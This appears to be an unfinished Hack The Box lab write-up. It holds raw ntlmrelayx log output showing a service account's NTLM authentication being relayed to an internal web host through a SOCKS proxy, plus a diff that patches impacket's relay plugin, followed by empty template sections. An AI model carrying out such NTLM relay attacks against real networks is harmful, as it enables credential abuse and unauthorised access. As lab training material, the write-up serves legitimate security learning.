[*] SOCKS proxy: 127.0.0.1:1080
[*] Kernel-mode auth workaround ENABLED
[*] Keep-relaying mode ENABLED (will reload targets after success)
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 8888
 * Serving Flask app 'lib.relay.servers.socksserver'
 * Debug mode: off
[*] Setting up WCF Server on port 9389

[*] Servers started, waiting for connections
Type help for list of commands
[*] Setting up RAW Server on port 6666
ghostsurf> [*] (HTTP): Client requested path: /healthcheck
[*] (HTTP): Client requested path: /healthcheck
[*] (HTTP): Connection from 10.129.190.87 controlled, attacking target http://gpz-op26-secure.ghostlink.htb
[*] (HTTP): Client requested path: /healthcheck
[*] HTTP server returned error code 200, treating as a successful login
[*] (HTTP): Authenticating connection from GHOSTLINK/SVC_CANARY@10.129.190.87 against http://gpz-op26-secure.ghostlink.htb SUCCEED [1]
[*] SOCKS: Adding GHOSTLINK/SVC_CANARY@gpz-op26-secure.ghostlink.htb(80) to active SOCKS connection. Enjoy
[*] (HTTP): Client requested path: /healthcheck
[*] (HTTP): Client requested path: /healthcheck
[*] All targets processed!
[*] (HTTP): Connection from 10.129.190.87 controlled, attacking target http://gpz-op26-secure.ghostlink.htb
[*] (HTTP): Client requested path: /healthcheck
[*] HTTP server returned error code 200, treating as a successful login
[*] (HTTP): Authenticating connection from GHOSTLINK/SVC_CANARY@10.129.190.87 against http://gpz-op26-secure.ghostlink.htb SUCCEED [2]
[*] Relay connection for GHOSTLINK/SVC_CANARY at gpz-op26-secure.ghostlink.htb(80) already exists. Discarding
[*] (HTTP): Client requested path: /healthcheck
[*] (HTTP): Client requested path: /healthcheck
[*] All targets processed!
[*] (HTTP): Connection from 10.129.190.87 controlled, attacking target http://gpz-op26-secure.ghostlink.htb
[*] (HTTP): Client requested path: /healthcheck
[*] HTTP server returned error code 200, treating as a successful login
[*] (HTTP): Authenticating connection from GHOSTLINK/SVC_CANARY@10.129.190.87 against http://gpz-op26-secure.ghostlink.htb SUCCEED [3]
[*] Relay connection for GHOSTLINK/SVC_CANARY at gpz-op26-secure.ghostlink.htb(80) already exists. Discarding
[*] (HTTP): Client requested path: /healthcheck
[*] (HTTP): Client requested path: /healthcheck
[*] All targets processed!
[*] (HTTP): Connection from 10.129.190.87 controlled, attacking target http://gpz-op26-secure.ghostlink.htb
[*] (HTTP): Client requested path: /healthcheck
[*] HTTP server returned error code 200, treating as a successful login
[*] (HTTP): Authenticating connection from GHOSTLINK/SVC_CANARY@10.129.190.87 against http://gpz-op26-secure.ghostlink.htb SUCCEED [4]
[*] Relay connection for GHOSTLINK/SVC_CANARY at gpz-op26-secure.ghostlink.htb(80) already exists. Discarding
[*] (HTTP): Client requested path: /healthcheck
[*] (HTTP): Client requested path: /healthcheck
[*] All targets processed!
[*] (HTTP): Connection from 10.129.190.87 controlled, attacking target http://gpz-op26-secure.ghostlink.htb
[*] (HTTP): Client requested path: /healthcheck
[*] HTTP server returned error code 200, treating as a successful login
[*] (HTTP): Authenticating connection from GHOSTLINK/SVC_CANARY@10.129.190.87 against http://gpz-op26-secure.ghostlink.htb SUCCEED [5]
[*] Relay connection for GHOSTLINK/SVC_CANARY at gpz-op26-secure.ghostlink.htb(80) already exists. Discarding


```

```
socks
Protocol  Target                         Username              AdminStatus  Port 
--------  -----------------------------  --------------------  -----------  ----
HTTP      gpz-op26-secure.ghostlink.htb  GHOSTLINK/SVC_CANARY  N/A          80  
```

img now works

configuring burp to tunnel through the proxy and test the enpoints


fix the bug

```
 git fetch https://github.com/fortra/impacket.git pull/2287/head:pr-2287
remote: Enumerating objects: 1018, done.
remote: Counting objects: 100% (642/642), done.
remote: Compressing objects: 100% (178/178), done.
remote: Total 1018 (delta 552), reused 464 (delta 464), pack-reused 376 (from 2)
Receiving objects: 100% (1018/1018), 1.36 MiB | 2.19 MiB/s, done.
Resolving deltas: 100% (685/685), completed with 121 local objects.
From https://github.com/fortra/impacket
 * [new ref]           refs/pull/2287/head -> pr-2287
 * [new tag]           impacket_0_13_1     -> impacket_0_13_1

```

```shell
 git show pr-2287:impacket/examples/ntlmrelayx/servers/socksplugins/http.py > /tmp/http_pr.py
diff /usr/lib/python3/dist-packages/impacket/examples/ntlmrelayx/servers/socksplugins/http.py /tmp/http_pr.py
163c163
<             if part == '':
---
>             if part == b'':
170c170
<                 response.append('Connection: Keep-Alive')
---
>                 response.append(b'Connection: Keep-Alive')
176c176,177
<         response.append(data.split(EOL+EOL)[1])
---
>         headerSize = data.find(EOL+EOL)
>         response.append(data[headerSize+4:] if headerSize != -1 else b'')
180d180
<         headerSize = data.find(EOL+EOL)
                                                                                                                
┌──(kali㉿kali)-[~/tools/ad/impacket]
└─$ sudo cp /tmp/http_pr.py /usr/lib/python3/dist-packages/impacket/examples/ntlmrelayx/servers/socksplugins/http.py
wc -l /usr/lib/python3/dist-packages/impacket/examples/ntlmrelayx/servers/socksplugins/http.py
206 /usr/lib/python3/dist-packages/impacket/examples/ntlmrelayx/servers/socksplugins/http.py

```

---
## Foothold

How you gained initial access to the machine.

### Vulnerability

Description of the vulnerability exploited.

### Exploitation

Step-by-step exploitation with commands.

```shell
# Commands used
```

---
## User Flag

### Lateral Movement (if applicable)

Steps to move from initial foothold to user access.

---
## Privilege Escalation

### Enumeration

What you found that leads to root/admin.

### Exploitation

Step-by-step privilege escalation.

```shell
# Commands used
```

---
## Remediation

- Key takeaway 1
- Key takeaway 2
- Key takeaway 3

---
## References

- [Reference 1](https://github.com/momenbasel/htb-writeups/blob/main/templates/url)
- [Reference 2](https://github.com/momenbasel/htb-writeups/blob/main/templates/url)